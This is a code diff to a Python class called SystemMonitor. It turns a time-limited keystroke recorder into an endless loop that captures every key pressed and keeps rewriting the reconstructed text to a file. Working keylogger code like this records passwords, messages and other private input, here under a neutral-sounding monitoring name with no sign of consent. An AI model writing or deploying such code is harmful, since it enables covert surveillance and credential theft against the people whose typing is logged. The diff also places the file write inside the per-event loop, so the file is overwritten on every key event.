@@ -160,28 +160,26 @@ class SystemMonitor:
         Returns:
             None
         """
-        
-        keyboard.start_recording()  
-        time.sleep(duration)
-        recorded = keyboard.stop_recording()  
-
         typed_text = []
-        for event in recorded:
-            if event.event_type == "down":
-                key = event.name
-                if key == "space":
-                    typed_text.append(" ")
-                elif key == "enter":
-                    typed_text.append("\n")
-                elif key == "backspace" and typed_text:
-                    typed_text.pop()
-                elif len(key) == 1:
-                    typed_text.append(key)
+        while True:
+            keyboard.start_recording()  
+            time.sleep(duration)
+            recorded = keyboard.stop_recording()
+            for event in recorded:
+                if event.event_type == "down":
+                    key = event.name
+                    if key == "space":
+                        typed_text.append(" ")
+                    elif key == "enter":
+                        typed_text.append("\n")
+                    elif key == "backspace" and typed_text:
+                        typed_text.pop()
+                    elif len(key) == 1:
+                        typed_text.append(key)
 
-        with open(output_file, "w", encoding="utf-8") as f:
-            f.write("".join(typed_text))
-
-        print(f"Text saved to {output_file}")
+                with open(output_file, "w", encoding="utf-8") as f:
+                    f.write("".join(typed_text))
+            print(f"Text saved to {output_file}")
 
     def start(self):
         """
